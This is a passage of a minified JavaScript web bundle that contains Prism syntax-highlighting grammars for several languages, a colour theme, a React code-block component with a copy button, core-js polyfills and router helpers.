\t])/,lookbehind:!0},operator:/(?:::|[?:+!])?=|[|@]/,punctuation:/[:;(){}]/},o.languages.objectivec=o.languages.extend("c",{string:{pattern:/@?"(?:\\(?:\r\n|[\s\S])|[^"\\\r\n])*"/,greedy:!0},keyword:/\b(?:asm|auto|break|case|char|const|continue|default|do|double|else|enum|extern|float|for|goto|if|in|inline|int|long|register|return|self|short|signed|sizeof|static|struct|super|switch|typedef|typeof|union|unsigned|void|volatile|while)\b|(?:@interface|@end|@implementation|@protocol|@class|@public|@protected|@private|@property|@try|@catch|@finally|@throw|@synthesize|@dynamic|@selector)\b/,operator:/-[->]?|\+\+?|!=?|<<?=?|>>?=?|==?|&&?|\|\|?|[~^%?*\/@]/}),delete o.languages.objectivec["class-name"],o.languages.objc=o.languages.objectivec,o.languages.ocaml={comment:{pattern:/\(\*[\s\S]*?\*\)/,greedy:!0},char:{pattern:/'(?:[^\\\r\n']|\\(?:.|[ox]?[0-9a-f]{1,3}))'/i,greedy:!0},string:[{pattern:/"(?:\\(?:[\s\S]|\r\n)|[^\\\r\n"])*"/,greedy:!0},{pattern:/\{([a-z_]*)\|[\s\S]*?\|\1\}/,greedy:!0}],number:[/\b(?:0b[01][01_]*|0o[0-7][0-7_]*)\b/i,/\b0x[a-f0-9][a-f0-9_]*(?:\.[a-f0-9_]*)?(?:p[+-]?\d[\d_]*)?(?!\w)/i,/\b\d[\d_]*(?:\.[\d_]*)?(?:e[+-]?\d[\d_]*)?(?!\w)/i],directive:{pattern:/\B#\w+/,alias:"property"},label:{pattern:/\B~\w+/,alias:"property"},"type-variable":{pattern:/\B'\w+/,alias:"function"},variant:{pattern:/`\w+/,alias:"symbol"},keyword:/\b(?:as|assert|begin|class|constraint|do|done|downto|else|end|exception|external|for|fun|function|functor|if|in|include|inherit|initializer|lazy|let|match|method|module|mutable|new|nonrec|object|of|open|private|rec|sig|struct|then|to|try|type|val|value|virtual|when|where|while|with)\b/,boolean:/\b(?:false|true)\b/,"operator-like-punctuation":{pattern:/\[[<>|]|[>|]\]|\{<|>\}/,alias:"punctuation"},operator:/\.[.~]|:[=>]|[=<>@^|&+\-*\/$%!?~][!$%&*+\-.\/:<=>?@^|~]*|\b(?:and|asr|land|lor|lsl|lsr|lxor|mod|or)\b/,punctuation:/;;|::|[(){}\[\].,:;#]|\b_\b/},o.languages.python={comment:{pattern:/(^|[^\\])#.*/,lookbehind:!0,greedy:!0},"string-interpolation":{pattern:/(?:f|fr|rf)(?:("""|''')[\s\S]*?\1|("|')(?:\\.|(?!\2)[^\\\r\n])*\2)/i,greedy:!0,inside:{interpolation:{pattern:/((?:^|[^{])(?:\{\{)*)\{(?!\{)(?:[^{}]|\{(?!\{)(?:[^{}]|\{(?!\{)(?:[^{}])+\})+\})+\}/,lookbehind:!0,inside:{"format-spec":{pattern:/(:)[^:(){}]+(?=\}$)/,lookbehind:!0},"conversion-option":{pattern:/![sra](?=[:}]$)/,alias:"punctuation"},rest:null}},string:/[\s\S]+/}},"triple-quoted-string":{pattern:/(?:[rub]|br|rb)?("""|''')[\s\S]*?\1/i,greedy:!0,alias:"string"},string:{pattern:/(?:[rub]|br|rb)?("|')(?:\\.|(?!\1)[^\\\r\n])*\1/i,greedy:!0},function:{pattern:/((?:^|\s)def[ \t]+)[a-zA-Z_]\w*(?=\s*\()/g,lookbehind:!0},"class-name":{pattern:/(\bclass\s+)\w+/i,lookbehind:!0},decorator:{pattern:/(^[\t ]*)@\w+(?:\.\w+)*/m,lookbehind:!0,alias:["annotation","punctuation"],inside:{punctuation:/\./}},keyword:/\b(?:_(?=\s*:)|and|as|assert|async|await|break|case|class|continue|def|del|elif|else|except|exec|finally|for|from|global|if|import|in|is|lambda|match|nonlocal|not|or|pass|print|raise|return|try|while|with|yield)\b/,builtin:/\b(?:__import__|abs|all|any|apply|ascii|basestring|bin|bool|buffer|bytearray|bytes|callable|chr|classmethod|cmp|coerce|compile|complex|delattr|dict|dir|divmod|enumerate|eval|execfile|file|filter|float|format|frozenset|getattr|globals|hasattr|hash|help|hex|id|input|int|intern|isinstance|issubclass|iter|len|list|locals|long|map|max|memoryview|min|next|object|oct|open|ord|pow|property|range|raw_input|reduce|reload|repr|reversed|round|set|setattr|slice|sorted|staticmethod|str|sum|super|tuple|type|unichr|unicode|vars|xrange|zip)\b/,boolean:/\b(?:False|None|True)\b/,number:/\b0(?:b(?:_?[01])+|o(?:_?[0-7])+|x(?:_?[a-f0-9])+)\b|(?:\b\d+(?:_\d+)*(?:\.(?:\d+(?:_\d+)*)?)?|\B\.\d+(?:_\d+)*)(?:e[+-]?\d+(?:_\d+)*)?j?(?!\w)/i,operator:/[-+%=]=?|!=|:=|\*\*?=?|\/\/?=?|<[<=>]?|>[=>]?|[&|^~]/,punctuation:/[{}[\];(),.:]/},o.languages.python["string-interpolation"].inside["interpolation"].inside.rest=o.languages.python,o.languages.py=o.languages.python,o.languages.reason=o.languages.extend("clike",{string:{pattern:/"(?:\\(?:\r\n|[\s\S])|[^\\\r\n"])*"/,greedy:!0},"class-name":/\b[A-Z]\w*/,keyword:/\b(?:and|as|assert|begin|class|constraint|do|done|downto|else|end|exception|external|for|fun|function|functor|if|in|include|inherit|initializer|lazy|let|method|module|mutable|new|nonrec|object|of|open|or|private|rec|sig|struct|switch|then|to|try|type|val|virtual|when|while|with)\b/,operator:/\.{3}|:[:=]|\|>|->|=(?:==?|>)?|<=?|>=?|[|^?'#!~`]|[+\-*\/]\.?|\b(?:asr|land|lor|lsl|lsr|lxor|mod)\b/}),o.languages.insertBefore("reason","class-name",{char:{pattern:/'(?:\\x[\da-f]{2}|\\o[0-3][0-7][0-7]|\\\d{3}|\\.|[^'\\\r\n])'/,greedy:!0},constructor:/\b[A-Z]\w*\b(?!\s*\.)/,label:{pattern:/\b[a-z]\w*(?=::)/,alias:"symbol"}}),delete o.languages.reason["function"],function(e){e.languages.sass=e.languages.extend("css",{comment:{pattern:/^([ \t]*)\/[\/*].*(?:(?:\r?\n|\r)\1[ \t].+)*/m,lookbehind:!0,greedy:!0}}),e.languages.insertBefore("sass","atrule",{"atrule-line":{pattern:/^(?:[ \t]*)[@+=].+/m,greedy:!0,inside:{atrule:/(?:@[\w-]+|[+=])/}}}),delete e.languages.sass.atrule;var t=/\$[-\w]+|#\{\$[-\w]+\}/,n=[/[+*\/%]|[=!]=|<=?|>=?|\b(?:and|not|or)\b/,{pattern:/(\s)-(?=\s)/,lookbehind:!0}];e.languages.insertBefore("sass","property",{"variable-line":{pattern:/^[ \t]*\$.+/m,greedy:!0,inside:{punctuation:/:/,variable:t,operator:n}},"property-line":{pattern:/^[ \t]*(?:[^:\s]+ *:.*|:[^:\s].*)/m,greedy:!0,inside:{property:[/[^:\s]+(?=\s*:)/,{pattern:/(:)[^:\s]+/,lookbehind:!0}],punctuation:/:/,variable:t,operator:n,important:e.languages.sass.important}}}),delete e.languages.sass.property,delete e.languages.sass.important,e.languages.insertBefore("sass","punctuation",{selector:{pattern:/^([ \t]*)\S(?:,[^,\r\n]+|[^,\r\n]*)(?:,[^,\r\n]+)*(?:,(?:\r?\n|\r)\1[ \t]+\S(?:,[^,\r\n]+|[^,\r\n]*)(?:,[^,\r\n]+)*)*/m,lookbehind:!0,greedy:!0}})}(o),o.languages.scss=o.languages.extend("css",{comment:{pattern:/(^|[^\\])(?:\/\*[\s\S]*?\*\/|\/\/.*)/,lookbehind:!0},atrule:{pattern:/@[\w-](?:\([^()]+\)|[^()\s]|\s+(?!\s))*?(?=\s+[{;])/,inside:{rule:/@[\w-]+/}},url:/(?:[-a-z]+-)?url(?=\()/i,selector:{pattern:/(?=\S)[^@;{}()]?(?:[^@;{}()\s]|\s+(?!\s)|#\{\$[-\w]+\})+(?=\s*\{(?:\}|\s|[^}][^:{}]*[:{][^}]))/,inside:{parent:{pattern:/&/,alias:"important"},placeholder:/%[-\w]+/,variable:/\$[-\w]+|#\{\$[-\w]+\}/}},property:{pattern:/(?:[-\w]|\$[-\w]|#\{\$[-\w]+\})+(?=\s*:)/,inside:{variable:/\$[-\w]+|#\{\$[-\w]+\}/}}}),o.languages.insertBefore("scss","atrule",{keyword:[/@(?:content|debug|each|else(?: if)?|extend|for|forward|function|if|import|include|mixin|return|use|warn|while)\b/i,{pattern:/( )(?:from|through)(?= )/,lookbehind:!0}]}),o.languages.insertBefore("scss","important",{variable:/\$[-\w]+|#\{\$[-\w]+\}/}),o.languages.insertBefore("scss","function",{"module-modifier":{pattern:/\b(?:as|hide|show|with)\b/i,alias:"keyword"},placeholder:{pattern:/%[-\w]+/,alias:"selector"},statement:{pattern:/\B!(?:default|optional)\b/i,alias:"keyword"},boolean:/\b(?:false|true)\b/,null:{pattern:/\bnull\b/,alias:"keyword"},operator:{pattern:/(\s)(?:[-+*\/%]|[=!]=|<=?|>=?|and|not|or)(?=\s)/,lookbehind:!0}}),o.languages.scss["atrule"].inside.rest=o.languages.scss,function(e){var t={pattern:/(\b\d+)(?:%|[a-z]+)/,lookbehind:!0},n={pattern:/(^|[^\w.-])-?(?:\d+(?:\.\d+)?|\.\d+)/,lookbehind:!0},a={comment:{pattern:/(^|[^\\])(?:\/\*[\s\S]*?\*\/|\/\/.*)/,lookbehind:!0},url:{pattern:/\burl\((["']?).*?\1\)/i,greedy:!0},string:{pattern:/("|')(?:(?!\1)[^\\\r\n]|\\(?:\r\n|[\s\S]))*\1/,greedy:!0},interpolation:null,func:null,important:/\B!(?:important|optional)\b/i,keyword:{pattern:/(^|\s+)(?:(?:else|for|if|return|unless)(?=\s|$)|@[\w-]+)/,lookbehind:!0},hexcode:/#[\da-f]{3,6}/i,color:[/\b(?:AliceBlue|AntiqueWhite|Aqua|Aquamarine|Azure|Beige|Bisque|Black|BlanchedAlmond|Blue|BlueViolet|Brown|BurlyWood|CadetBlue|Chartreuse|Chocolate|Coral|CornflowerBlue|Cornsilk|Crimson|Cyan|DarkBlue|DarkCyan|DarkGoldenRod|DarkGr[ae]y|DarkGreen|DarkKhaki|DarkMagenta|DarkOliveGreen|DarkOrange|DarkOrchid|DarkRed|DarkSalmon|DarkSeaGreen|DarkSlateBlue|DarkSlateGr[ae]y|DarkTurquoise|DarkViolet|DeepPink|DeepSkyBlue|DimGr[ae]y|DodgerBlue|FireBrick|FloralWhite|ForestGreen|Fuchsia|Gainsboro|GhostWhite|Gold|GoldenRod|Gr[ae]y|Green|GreenYellow|HoneyDew|HotPink|IndianRed|Indigo|Ivory|Khaki|Lavender|LavenderBlush|LawnGreen|LemonChiffon|LightBlue|LightCoral|LightCyan|LightGoldenRodYellow|LightGr[ae]y|LightGreen|LightPink|LightSalmon|LightSeaGreen|LightSkyBlue|LightSlateGr[ae]y|LightSteelBlue|LightYellow|Lime|LimeGreen|Linen|Magenta|Maroon|MediumAquaMarine|MediumBlue|MediumOrchid|MediumPurple|MediumSeaGreen|MediumSlateBlue|MediumSpringGreen|MediumTurquoise|MediumVioletRed|MidnightBlue|MintCream|MistyRose|Moccasin|NavajoWhite|Navy|OldLace|Olive|OliveDrab|Orange|OrangeRed|Orchid|PaleGoldenRod|PaleGreen|PaleTurquoise|PaleVioletRed|PapayaWhip|PeachPuff|Peru|Pink|Plum|PowderBlue|Purple|Red|RosyBrown|RoyalBlue|SaddleBrown|Salmon|SandyBrown|SeaGreen|SeaShell|Sienna|Silver|SkyBlue|SlateBlue|SlateGr[ae]y|Snow|SpringGreen|SteelBlue|Tan|Teal|Thistle|Tomato|Transparent|Turquoise|Violet|Wheat|White|WhiteSmoke|Yellow|YellowGreen)\b/i,{pattern:/\b(?:hsl|rgb)\(\s*\d{1,3}\s*,\s*\d{1,3}%?\s*,\s*\d{1,3}%?\s*\)\B|\b(?:hsl|rgb)a\(\s*\d{1,3}\s*,\s*\d{1,3}%?\s*,\s*\d{1,3}%?\s*,\s*(?:0|0?\.\d+|1)\s*\)\B/i,inside:{unit:t,number:n,function:/[\w-]+(?=\()/,punctuation:/[(),]/}}],entity:/\\[\da-f]{1,8}/i,unit:t,boolean:/\b(?:false|true)\b/,operator:[/~|[+!\/%<>?=]=?|[-:]=|\*[*=]?|\.{2,3}|&&|\|\||\B-\B|\b(?:and|in|is(?: a| defined| not|nt)?|not|or)\b/],number:n,punctuation:/[{}()\[\];:,]/};a["interpolation"]={pattern:/\{[^\r\n}:]+\}/,alias:"variable",inside:{delimiter:{pattern:/^\{|\}$/,alias:"punctuation"},rest:a}},a["func"]={pattern:/[\w-]+\([^)]*\).*/,inside:{function:/^[^(]+/,rest:a}},e.languages.stylus={"atrule-declaration":{pattern:/(^[ \t]*)@.+/m,lookbehind:!0,inside:{atrule:/^@[\w-]+/,rest:a}},"variable-declaration":{pattern:/(^[ \t]*)[\w$-]+\s*.?=[ \t]*(?:\{[^{}]*\}|\S.*|$)/m,lookbehind:!0,inside:{variable:/^\S+/,rest:a}},statement:{pattern:/(^[ \t]*)(?:else|for|if|return|unless)[ \t].+/m,lookbehind:!0,inside:{keyword:/^\S+/,rest:a}},"property-declaration":{pattern:/((?:^|\{)([ \t]*))(?:[\w-]|\{[^}\r\n]+\})+(?:\s*:\s*|[ \t]+)(?!\s)[^{\r\n]*(?:;|[^{\r\n,]$(?!(?:\r?\n|\r)(?:\{|\2[ \t])))/m,lookbehind:!0,inside:{property:{pattern:/^[^\s:]+/,inside:{interpolation:a.interpolation}},rest:a}},selector:{pattern:/(^[ \t]*)(?:(?=\S)(?:[^{}\r\n:()]|::?[\w-]+(?:\([^)\r\n]*\)|(?![\w-]))|\{[^}\r\n]+\})+)(?:(?:\r?\n|\r)(?:\1(?:(?=\S)(?:[^{}\r\n:()]|::?[\w-]+(?:\([^)\r\n]*\)|(?![\w-]))|\{[^}\r\n]+\})+)))*(?:,$|\{|(?=(?:\r?\n|\r)(?:\{|\1[ \t])))/m,lookbehind:!0,inside:{interpolation:a.interpolation,comment:a.comment,punctuation:/[{},]/}},func:a.func,string:a.string,comment:{pattern:/(^|[^\\])(?:\/\*[\s\S]*?\*\/|\/\/.*)/,lookbehind:!0,greedy:!0},interpolation:a.interpolation,punctuation:/[{}()\[\];:.]/}}(o),function(e){var t=e.util.clone(e.languages.typescript);e.languages.tsx=e.languages.extend("jsx",t),delete e.languages.tsx["parameter"],delete e.languages.tsx["literal-property"];var n=e.languages.tsx.tag;n.pattern=RegExp(/(^|[^\w$]|(?=<\/))/.source+"(?:"+n.pattern.source+")",n.pattern.flags),n.lookbehind=!0}(o),o.languages.wasm={comment:[/\(;[\s\S]*?;\)/,{pattern:/;;.*/,greedy:!0}],string:{pattern:/"(?:\\[\s\S]|[^"\\])*"/,greedy:!0},keyword:[{pattern:/\b(?:align|offset)=/,inside:{operator:/=/}},{pattern:/\b(?:(?:f32|f64|i32|i64)(?:\.(?:abs|add|and|ceil|clz|const|convert_[su]\/i(?:32|64)|copysign|ctz|demote\/f64|div(?:_[su])?|eqz?|extend_[su]\/i32|floor|ge(?:_[su])?|gt(?:_[su])?|le(?:_[su])?|load(?:(?:8|16|32)_[su])?|lt(?:_[su])?|max|min|mul|neg?|nearest|or|popcnt|promote\/f32|reinterpret\/[fi](?:32|64)|rem_[su]|rot[lr]|shl|shr_[su]|sqrt|store(?:8|16|32)?|sub|trunc(?:_[su]\/f(?:32|64))?|wrap\/i64|xor))?|memory\.(?:grow|size))\b/,inside:{punctuation:/\./}},/\b(?:anyfunc|block|br(?:_if|_table)?|call(?:_indirect)?|data|drop|elem|else|end|export|func|get_(?:global|local)|global|if|import|local|loop|memory|module|mut|nop|offset|param|result|return|select|set_(?:global|local)|start|table|tee_local|then|type|unreachable)\b/],variable:/\$[\w!#$%&'*+\-./:<=>?@\\^`|~]+/,number:/[+-]?\b(?:\d(?:_?\d)*(?:\.\d(?:_?\d)*)?(?:[eE][+-]?\d(?:_?\d)*)?|0x[\da-fA-F](?:_?[\da-fA-F])*(?:\.[\da-fA-F](?:_?[\da-fA-D])*)?(?:[pP][+-]?\d(?:_?\d)*)?)\b|\binf\b|\bnan(?::0x[\da-fA-F](?:_?[\da-fA-D])*)?\b/,punctuation:/[()]/};var i=o,c={plain:{backgroundColor:"#2a2734",color:"#9a86fd"},styles:[{types:["comment","prolog","doctype","cdata","punctuation"],style:{color:"#6c6783"}},{types:["namespace"],style:{opacity:.7}},{types:["tag","operator","number"],style:{color:"#e09142"}},{types:["property","function"],style:{color:"#9a86fd"}},{types:["tag-id","selector","atrule-id"],style:{color:"#eeebff"}},{types:["attr-name"],style:{color:"#c4b9fe"}},{types:["boolean","string","entity","url","attr-value","keyword","control","directive","unit","statement","regex","atrule","placeholder","variable"],style:{color:"#ffcc99"}},{types:["deleted"],style:{textDecorationLine:"line-through"}},{types:["inserted"],style:{textDecorationLine:"underline"}},{types:["italic"],style:{fontStyle:"italic"}},{types:["important","bold"],style:{fontWeight:"bold"}},{types:["important"],style:{color:"#c4b9fe"}}]},s=c,u={Prism:i,theme:s};function d(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function m(){return m=Object.assign||function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},m.apply(this,arguments)}var p=/\r\n|\r|\n/,h=function(e){0===e.length?e.push({types:["plain"],content:"\n",empty:!0}):1===e.length&&""===e[0].content&&(e[0].content="\n",e[0].empty=!0)},g=function(e,t){var n=e.length;return n>0&&e[n-1]===t?e:e.concat(t)},f=function(e){var t=[[]],n=[e],a=[0],r=[e.length],l=0,o=0,i=[],c=[i];while(o>-1){while((l=a[o]++)<r[o]){var s=void 0,u=t[o],d=n[o],m=d[l];if("string"===typeof m?(u=o>0?u:["plain"],s=m):(u=g(u,m.type),m.alias&&(u=g(u,m.alias)),s=m.content),"string"===typeof s){var f=s.split(p),E=f.length;i.push({types:u,content:f[0]});for(var b=1;b<E;b++)h(i),c.push(i=[]),i.push({types:u,content:f[b]})}else o++,t.push(u),n.push(s),a.push(0),r.push(s.length)}o--,t.pop(),n.pop(),a.pop(),r.pop()}return h(i),c},E=function(e,t){var n=e.plain,a=Object.create(null),r=e.styles.reduce((function(e,n){var a=n.languages,r=n.style;return a&&!a.includes(t)||n.types.forEach((function(t){var n=m({},e[t],r);e[t]=n})),e}),a);return r.root=n,r.plain=m({},n,{backgroundColor:null}),r};function b(e,t){var n={};for(var a in e)Object.prototype.hasOwnProperty.call(e,a)&&-1===t.indexOf(a)&&(n[a]=e[a]);return n}var v=function(e){function t(){var t=this,n=[],a=arguments.length;while(a--)n[a]=arguments[a];e.apply(this,n),d(this,"getThemeDict",(function(e){if(void 0!==t.themeDict&&e.theme===t.prevTheme&&e.language===t.prevLanguage)return t.themeDict;t.prevTheme=e.theme,t.prevLanguage=e.language;var n=e.theme?E(e.theme,e.language):void 0;return t.themeDict=n})),d(this,"getLineProps",(function(e){var n=e.key,a=e.className,r=e.style,l=b(e,["key","className","style","line"]),o=l,i=m({},o,{className:"token-line",style:void 0,key:void 0}),c=t.getThemeDict(t.props);return void 0!==c&&(i.style=c.plain),void 0!==r&&(i.style=void 0!==i.style?m({},i.style,r):r),void 0!==n&&(i.key=n),a&&(i.className+=" "+a),i})),d(this,"getStyleForToken",(function(e){var n=e.types,a=e.empty,r=n.length,l=t.getThemeDict(t.props);if(void 0!==l){if(1===r&&"plain"===n[0])return a?{display:"inline-block"}:void 0;if(1===r&&!a)return l[n[0]];var o=a?{display:"inline-block"}:{},i=n.map((function(e){return l[e]}));return Object.assign.apply(Object,[o].concat(i))}})),d(this,"getTokenProps",(function(e){var n=e.key,a=e.className,r=e.style,l=e.token,o=b(e,["key","className","style","token"]),i=o,c=m({},i,{className:"token "+l.types.join(" "),children:l.content,style:t.getStyleForToken(l),key:void 0});return void 0!==r&&(c.style=void 0!==c.style?m({},c.style,r):r),void 0!==n&&(c.key=n),a&&(c.className+=" "+a),c})),d(this,"tokenize",(function(e,t,n,a){var r={code:t,grammar:n,language:a,tokens:[]};e.hooks.run("before-tokenize",r);var l=r.tokens=e.tokenize(r.code,r.grammar,r.language);return e.hooks.run("after-tokenize",r),l}))}return e&&(t.__proto__=e),t.prototype=Object.create(e&&e.prototype),t.prototype.constructor=t,t.prototype.render=function(){var e=this.props,t=e.Prism,n=e.language,a=e.code,r=e.children,l=this.getThemeDict(this.props),o=t.languages[n],i=void 0!==o?this.tokenize(t,a,o,n):[a],c=f(i);return r({tokens:c,className:"prism-code language-"+n,style:void 0!==l?l.root:{},getLineProps:this.getLineProps,getTokenProps:this.getTokenProps})},t}(a["Component"]),y=v,k=n("j00X");n("fek2"),n("qcID");function w(){return w=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},w.apply(this,arguments)}function x(e,t){return L(e)||A(e,t)||S(e,t)||j()}function j(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function S(e,t){if(e){if("string"===typeof e)return C(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?C(e,t):void 0}}function C(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function A(e,t){var n=null==e?null:"undefined"!==typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l=[],o=!0,i=!1;try{for(n=n.call(e);!(o=(a=n.next()).done);o=!0)if(l.push(a.value),t&&l.length===t)break}catch(c){i=!0,r=c}finally{try{o||null==n["return"]||n["return"]()}finally{if(i)throw r}}return l}}function L(e){if(Array.isArray(e))return e}var T={acss:"css",axml:"xml"};t["a"]=function(e){var t=e.code,n=e.lang,a=e.showCopy,l=void 0===a||a,o=Object(k["useCopy"])(),i=x(o,2),c=i[0],s=i[1];return r.a.createElement("div",{className:"__dumi-default-code-block"},r.a.createElement(y,w({},u,{code:t,language:T[n]||n,theme:void 0}),(function(e){var n=e.className,a=e.style,o=e.tokens,i=e.getLineProps,u=e.getTokenProps;return r.a.createElement("pre",{className:n,style:a},l&&r.a.createElement("button",{className:"__dumi-default-icon __dumi-default-code-block-copy-btn","data-status":s,onClick:function(){return c(t)}}),o.map((function(e,t){return r.a.createElement("div",i({line:e,key:t}),e.map((function(e,t){return r.a.createElement("span",u({token:e,key:t}))})))})))})))}},P0Lz:function(e,t,n){var a=n("AzF/");e.exports=function(e,t,n){for(var r in t)a(e,r,t[r],n);return e}},P2oP:function(e,t,n){"use strict";var a=n("0mt+"),r=n("A0UU"),l=n("Dx5A"),o=n("tPcN"),i="ArrayBuffer",c=l[i],s=r[i];a({global:!0,forced:s!==c},{ArrayBuffer:c}),o(i)},P64i:function(e,t,n){"use strict";var a=n("ra1n"),r=n("vyxk"),l=n("oyD1"),o=n("tS9j"),i=n("j9ts"),c=n("rSPa"),s=n("N0Us"),u=n("JAZO"),d=n("KeQb"),m=n("Xdqv"),p=[].push,h=Math.min,g=4294967295,f=!m((function(){return!RegExp(g,"y")}));a("split",2,(function(e,t,n){var a;return a="c"=="abbc".split(/(b)*/)[1]||4!="test".split(/(?:)/,-1).length||2!="ab".split(/(?:ab)*/).length||4!=".".split(/(.?)(.?)/).length||".".split(/()()/).length>1||"".split(/.?/).length?function(e,n){var a=String(o(this)),l=void 0===n?g:n>>>0;if(0===l)return[];if(void 0===e)return[a];if(!r(e))return t.call(a,e,l);var i,c,s,u=[],m=(e.ignoreCase?"i":"")+(e.multiline?"m":"")+(e.unicode?"u":"")+(e.sticky?"y":""),h=0,f=new RegExp(e.source,m+"g");while(i=d.call(f,a)){if(c=f.lastIndex,c>h&&(u.push(a.slice(h,i.index)),i.length>1&&i.index<a.length&&p.apply(u,i.slice(1)),s=i[0].length,h=c,u.length>=l))break;f.lastIndex===i.index&&f.lastIndex++}return h===a.length?!s&&f.test("")||u.push(""):u.push(a.slice(h)),u.length>l?u.slice(0,l):u}:"0".split(void 0,0).length?function(e,n){return void 0===e&&0===n?[]:t.call(this,e,n)}:t,[function(t,n){var r=o(this),l=void 0==t?void 0:t[e];return void 0!==l?l.call(t,r,n):a.call(String(r),t,n)},function(e,r){var o=n(a,e,this,r,a!==t);if(o.done)return o.value;var d=l(e),m=String(this),p=i(d,RegExp),E=d.unicode,b=(d.ignoreCase?"i":"")+(d.multiline?"m":"")+(d.unicode?"u":"")+(f?"y":"g"),v=new p(f?d:"^(?:"+d.source+")",b),y=void 0===r?g:r>>>0;if(0===y)return[];if(0===m.length)return null===u(v,m)?[m]:[];var k=0,w=0,x=[];while(w<m.length){v.lastIndex=f?w:0;var j,S=u(v,f?m:m.slice(w));if(null===S||(j=h(s(v.lastIndex+(f?0:w)),m.length))===k)w=c(m,w,E);else{if(x.push(m.slice(k,w)),x.length===y)return x;for(var C=1;C<=S.length-1;C++)if(x.push(S[C]),x.length===y)return x;w=k=j}}return x.push(m.slice(k)),x}]}),!f)},PAgB:function(e,t,n){"use strict";var a=n("XaNN"),r=function(e){var t,n;this.promise=new e((function(e,a){if(void 0!==t||void 0!==n)throw TypeError("Bad Promise constructor");t=e,n=a})),this.resolve=a(t),this.reject=a(n)};e.exports.f=function(e){return new r(e)}},PBCt:function(e,t,n){"use strict";var a=n("upI0")["default"];Object.defineProperty(t,"__esModule",{value:!0});var r=n("310B"),l=n("FU0I"),o=n("kqhb"),i=n("Ekl2");function c(e){return e&&"object"===typeof e&&"default"in e?e:{default:e}}var s=c(l);function u(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function d(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?u(Object(n),!0).forEach((function(t){h(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):u(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function m(e,t,n,a,r,l,o){try{var i=e[l](o),c=i.value}catch(s){return void n(s)}i.done?t(c):Promise.resolve(c).then(a,r)}function p(e){return function(){var t=this,n=arguments;return new Promise((function(a,r){var l=e.apply(t,n);function o(e){m(l,a,r,o,i,"next",e)}function i(e){m(l,a,r,o,i,"throw",e)}o(void 0)}))}}function h(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function g(){return g=Object.assign||function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},g.apply(this,arguments)}function f(e,t){if(null==e)return{};var n,a,r={},l=Object.keys(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}function E(e,t){if(null==e)return{};var n,a,r=f(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}function b(e,t){return v(e)||y(e,t)||k(e,t)||x()}function v(e){if(Array.isArray(e))return e}function y(e,t){var n=null==e?null:"undefined"!==typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l=[],o=!0,i=!1;try{for(n=n.call(e);!(o=(a=n.next()).done);o=!0)if(l.push(a.value),t&&l.length===t)break}catch(c){i=!0,r=c}finally{try{o||null==n["return"]||n["return"]()}finally{if(i)throw r}}return l}}function k(e,t){if(e){if("string"===typeof e)return w(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?w(e,t):void 0}}function w(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function x(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function j(e,t){var n="undefined"!==typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(!n){if(Array.isArray(e)||(n=k(e))||t&&e&&"number"===typeof e.length){n&&(e=n);var a=0,r=function(){};return{s:r,n:function(){return a>=e.length?{done:!0}:{done:!1,value:e[a++]}},e:function(e){throw e},f:r}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var l,o=!0,i=!1;return{s:function(){n=n.call(e)},n:function(){var e=n.next();return o=e.done,e},e:function(e){i=!0,l=e},f:function(){try{o||null==n["return"]||n["return"]()}finally{if(i)throw l}}}}function S(e){return s["default"].createElement(r.__RouterContext.Consumer,null,(function(t){var n=e.location||t.location,a=e.computedMatch,l=d(d({},t),{},{location:n,match:a}),o=e.render;return s["default"].createElement(r.__RouterContext.Provider,{value:l},l.match?o(d(d({},e.layoutProps),l)):null)}))}var C=["children"];function A(e){return s["default"].createElement(r.__RouterContext.Consumer,null,(function(t){var n,a=e.children,o=E(e,C),i=e.location||t.location,c=null;return l.Children.forEach(a,(function(e){if(null===c&&l.isValidElement(e)){n=e;var 